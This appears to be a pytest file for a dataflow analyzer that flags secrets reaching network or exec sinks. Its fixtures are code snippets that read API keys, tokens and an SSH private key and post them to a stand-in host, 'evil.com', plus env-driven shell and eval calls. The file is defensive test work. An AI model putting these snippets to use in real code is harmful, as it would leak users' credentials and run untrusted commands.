# tests/test_dataflow.py
"""Tests for the AST dataflow analysis engine (GAP 1)."""

import textwrap
from pathlib import Path

from agentseal.detection.dataflow import DataflowAnalyzer, DataflowFinding


class TestPythonDataflow:
    """Test Python AST-based taint tracking."""

    def setup_method(self):
        self.analyzer = DataflowAnalyzer()

    def test_env_to_requests_post(self):
        src = textwrap.dedent("""\
            import os
            import requests
            api_key = os.getenv("API_KEY")
            requests.post("https://evil.com", data=api_key)
        """)
        findings = self.analyzer.analyze(src, "test.py")
        assert len(findings) >= 1
        f = findings[0]
        assert f.source_type == "env_access"
        assert f.sink_type == "http_send"

    def test_environ_subscript_to_fetch(self):
        src = textwrap.dedent("""\
            import os
            token = os.environ["SECRET_TOKEN"]
            requests.post("https://evil.com", json={"token": token})
        """)
        findings = self.analyzer.analyze(src, "test.py")
        assert len(findings) >= 1

    def test_file_read_to_network(self):
        src = textwrap.dedent("""\
            key = open(".ssh/id_rsa").read()
            import requests
            requests.post("https://evil.com", data=key)
        """)
        findings = self.analyzer.analyze(src, "test.py")
        assert len(findings) >= 1
        assert findings[0].source_type == "file_read"

    def test_taint_through_fstring(self):
        src = textwrap.dedent("""\
            import os, requests
            secret = os.getenv("SECRET")
            payload = f"token={secret}"
            requests.post("https://evil.com", data=payload)
        """)
        findings = self.analyzer.analyze(src, "test.py")
        assert len(findings) >= 1

    def test_taint_through_dict(self):
        src = textwrap.dedent("""\
            import os, requests
            key = os.getenv("KEY")
            data = {"key": key}
            requests.post("https://evil.com", json=data)
        """)
        findings = self.analyzer.analyze(src, "test.py")
        assert len(findings) >= 1

    def test_no_false_positive_safe_code(self):
        src = textwrap.dedent("""\
            import requests
            data = {"message": "hello"}
            requests.post("https://api.com", json=data)
        """)
        findings = self.analyzer.analyze(src, "test.py")
        assert len(findings) == 0

    def test_exec_sink(self):
        src = textwrap.dedent("""\
            import os, subprocess
            cmd = os.getenv("CMD")
            subprocess.run(cmd, shell=True)
        """)
        findings = self.analyzer.analyze(src, "test.py")
        assert len(findings) >= 1
        assert findings[0].sink_type == "exec_call"

    def test_syntax_error_returns_empty(self):
        src = "def foo(:\n  pass"
        findings = self.analyzer.analyze(src, "test.py")
        assert findings == []

    def test_eval_sink(self):
        src = textwrap.dedent("""\
            import os
            code = os.getenv("CODE")
            eval(code)
        """)
        findings = self.analyzer.analyze(src, "test.py")
        assert len(findings) >= 1

    def test_environ_get_to_httpx(self):
        src = textwrap.dedent("""\
            import os
            import httpx
            key = os.environ.get("API_KEY")
            httpx.post("https://evil.com", data=key)
        """)
        findings = self.analyzer.analyze(src, "test.py")
        assert len(findings) >= 1


class TestJSFallback:
    """Test JS/TS regex-based fallback."""

    def setup_method(self):
        self.analyzer = DataflowAnalyzer()

    def test_process_env_to_fetch(self):
        src = textwrap.dedent("""\
            const token = process.env.API_TOKEN;
            fetch("https://evil.com", { method: "POST", body: token });
        """)
        findings = self.analyzer.analyze(src, "test.js")
        assert len(findings) >= 1
        assert findings[0].source_type == "env_access"
        assert findings[0].sink_type == "http_send"

    def test_no_source_no_finding(self):
        src = 'fetch("https://api.com/data");'
        findings = self.analyzer.analyze(src, "test.ts")
        assert len(findings) == 0

    def test_tsx_file_supported(self):
        src = textwrap.dedent("""\
            const key = process.env.SECRET;
            axios.post("/api", { key });
        """)
        findings = self.analyzer.analyze(src, "app.tsx")
        assert len(findings) >= 1


class TestAnalyzeFile:
    """Test file-based analysis."""

    def test_analyze_file(self, tmp_path: Path):
        script = tmp_path / "evil.py"
        script.write_text(textwrap.dedent("""\
            import os, requests
            token = os.getenv("TOKEN")
            requests.post("https://evil.com", data=token)
        """))
        analyzer = DataflowAnalyzer()
        findings = analyzer.analyze_file(script)
        assert len(findings) >= 1

    def test_missing_file(self, tmp_path: Path):
        analyzer = DataflowAnalyzer()
        findings = analyzer.analyze_file(tmp_path / "nonexistent.py")
        assert findings == []
